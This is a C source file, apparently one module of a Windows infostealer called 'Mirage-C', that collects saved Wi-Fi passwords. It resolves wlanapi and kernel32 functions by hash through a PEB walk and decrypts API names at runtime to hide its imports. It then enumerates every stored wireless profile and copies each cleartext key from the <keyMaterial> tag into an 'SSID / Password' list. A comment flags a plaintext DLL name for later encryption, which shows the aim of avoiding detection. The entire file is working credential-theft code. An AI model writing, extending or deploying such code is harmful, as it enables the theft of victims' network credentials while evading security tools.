/*
 * wifi.c — WiFi password extraction for Mirage-C
 *
 * PEB-walk wlanapi.dll, enumerate profiles, extract cleartext
 * key from XML <keyMaterial> tag.
 */

#include "wifi.h"
#include "config.h"
#include <windows.h>
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include "nt_types.h"
#include <string.h>
#include <stdio.h>

#ifdef ENABLE_WIFI_PASSWORDS

#define WLAN_MAX_NAME_LEN    256
#define WIFI_MAX_ENTRY       512

#ifndef _GUID_DEFINED
#define _GUID_DEFINED
typedef struct _GUID { DWORD Data1; WORD Data2; WORD Data3; BYTE Data4[8]; } GUID;
#endif

typedef HANDLE WLAN_HANDLE;

#ifndef WLAN_API_VERSION_2_0
#define WLAN_API_VERSION_2_0  2
#endif

typedef struct { GUID InterfaceGuid; WCHAR strInterfaceDescription[WLAN_MAX_NAME_LEN]; DWORD isState; } WLAN_INTERFACE_INFO;
typedef struct { DWORD dwNumberOfItems; DWORD dwIndex; WLAN_INTERFACE_INFO InterfaceInfo[1]; } WLAN_INTERFACE_INFO_LIST;
typedef struct { WCHAR strProfileName[WLAN_MAX_NAME_LEN]; DWORD dwFlags; } WLAN_PROFILE_INFO;
typedef struct { DWORD dwNumberOfItems; DWORD dwIndex; WLAN_PROFILE_INFO ProfileInfo[1]; } WLAN_PROFILE_INFO_LIST;

/* ponytail: unique typedef names to avoid MinGW wlanapi.h macro collisions */
typedef DWORD  (WINAPI *wf_Open)(DWORD, void *, DWORD*, WLAN_HANDLE*);
typedef DWORD  (WINAPI *wf_Enum)(WLAN_HANDLE, void *, WLAN_INTERFACE_INFO_LIST**);
typedef DWORD  (WINAPI *wf_GPList)(WLAN_HANDLE, const GUID*, void *, WLAN_PROFILE_INFO_LIST**);
typedef DWORD  (WINAPI *wf_GP)(WLAN_HANDLE, const GUID*, const WCHAR*, DWORD*, WCHAR**, DWORD*);
typedef void   (WINAPI *wf_Free)(void *);
typedef DWORD  (WINAPI *wf_Close)(WLAN_HANDLE, void *);
typedef HANDLE (WINAPI *wf_GH)(void);
typedef LPVOID (WINAPI *wf_HA)(HANDLE, DWORD, SIZE_T);
typedef BOOL   (WINAPI *wf_HF)(HANDLE, DWORD, LPVOID);

static struct {
    wf_Open   fnOpen;   wf_Enum   fnEnum;    wf_GPList fnGPL;
    wf_GP     fnGP;     wf_Free   fnFree;    wf_Close  fnClose;
    wf_GH     fnGH;     wf_HA     fnHA;      wf_HF     fnHF;
    int       ready;
} wlan_api;

static int wf_ensure_api(void) {
    if (wlan_api.ready) return 1;
    char dll[32], fn[48];

    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;

    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
    wlan_api.fnGH = (wf_GH)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
    wlan_api.fnHA = (wf_HA)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
    wlan_api.fnHF = (wf_HF)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!wlan_api.fnGH || !wlan_api.fnHA || !wlan_api.fnHF) return 0;

    /* ponytail: plaintext "wlanapi.dll", move to enc_strings.h later */
    void *wlan = mirage_get_module_by_hash(mirage_encrypted_hash_module("wlanapi.dll"));
    if (!wlan) return 0;

    wlan_api.fnOpen  = (wf_Open)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanOpenHandle"));
    wlan_api.fnEnum  = (wf_Enum)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanEnumInterfaces"));
    wlan_api.fnGPL   = (wf_GPList)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanGetProfileList"));
    wlan_api.fnGP    = (wf_GP)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanGetProfile"));
    wlan_api.fnFree  = (wf_Free)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanFreeMemory"));
    wlan_api.fnClose = (wf_Close)mirage_get_function_by_hash(wlan, mirage_encrypted_hash_func("WlanCloseHandle"));

    if (!wlan_api.fnOpen || !wlan_api.fnEnum || !wlan_api.fnGPL ||
        !wlan_api.fnGP || !wlan_api.fnFree || !wlan_api.fnClose)
        return 0;

    wlan_api.ready = 1;
    return 1;
}

static const char *xml_get_value(const char *xml, const char *tag, size_t *vlen) {
    size_t tlen = strlen(tag);
    char open[64], close[64];
    if (tlen + 3 >= sizeof(open)) return NULL;
    open[0] = '<'; memcpy(open+1, tag, tlen); open[tlen+1] = '>'; open[tlen+2] = '\0';
    close[0] = '<'; close[1] = '/'; memcpy(close+2, tag, tlen);
    close[tlen+2] = '>'; close[tlen+3] = '\0';
    const char *s = strstr(xml, open);
    if (!s) return NULL;
    s += tlen + 2;
    const char *e = strstr(s, close);
    if (!e) return NULL;
    *vlen = (size_t)(e - s);
    return s;
}

static void wide_to_narrow(const WCHAR *src, char *dst, size_t dst_size) {
    size_t i = 0;
    for (; i < dst_size - 1 && src[i]; i++) dst[i] = (char)(src[i] & 0x7F);
    dst[i] = '\0';
}

int mirage_collect_wifi_passwords(char *output, size_t outlen) {
    if (!output || outlen < 4) return 0;
    output[0] = '\0';
    if (!wf_ensure_api()) return 0;

    WLAN_HANDLE hWlan = NULL;
    DWORD neg = 0;
    if (wlan_api.fnOpen(WLAN_API_VERSION_2_0, NULL, &neg, &hWlan) != 0 || !hWlan)
        return 0;

    WLAN_INTERFACE_INFO_LIST *iflist = NULL;
    if (wlan_api.fnEnum(hWlan, NULL, &iflist) != 0 || !iflist) {
        wlan_api.fnClose(hWlan, NULL);
        return 0;
    }

    char *pos = output;
    size_t remain = outlen - 1;
    int count = 0;

    for (DWORD i = 0; i < iflist->dwNumberOfItems; i++) {
        const GUID *ifguid = &iflist->InterfaceInfo[i].InterfaceGuid;
        WLAN_PROFILE_INFO_LIST *profs = NULL;
        if (wlan_api.fnGPL(hWlan, ifguid, NULL, &profs) != 0 || !profs)
            continue;

        for (DWORD j = 0; j < profs->dwNumberOfItems; j++) {
            if (count >= WIFI_MAX_ENTRY) break;
            WCHAR *xml = NULL;
            const WCHAR *pname = profs->ProfileInfo[j].strProfileName;
            if (wlan_api.fnGP(hWlan, ifguid, pname, NULL, &xml, NULL) != 0 || !xml)
                continue;

            size_t xml_wlen = 0;
            for (const WCHAR *p = xml; *p; p++) xml_wlen++;
            char *xml_n = (char *)wlan_api.fnHA(wlan_api.fnGH(), 0, xml_wlen + 1);
            if (!xml_n) { wlan_api.fnFree(xml); continue; }
            wide_to_narrow(xml, xml_n, xml_wlen + 1);

            size_t klen = 0;
            const char *key = xml_get_value(xml_n, "keyMaterial", &klen);
            if (key && klen > 0) {
                char ssid[WLAN_MAX_NAME_LEN];
                wide_to_narrow(pname, ssid, sizeof(ssid));
                int n = snprintf(pos, remain, "SSID: %s / Password: %.*s\n",
                                 ssid, (int)klen, key);
                if (n > 0 && (size_t)n < remain) { pos += n; remain -= (size_t)n; count++; }
            }
            wlan_api.fnHF(wlan_api.fnGH(), 0, xml_n);
            wlan_api.fnFree(xml);
        }
        wlan_api.fnFree(profs);
    }

    wlan_api.fnFree(iflist);
    wlan_api.fnClose(hWlan, NULL);
    *pos = '\0';
    return count;
}

#endif /* ENABLE_WIFI_PASSWORDS */
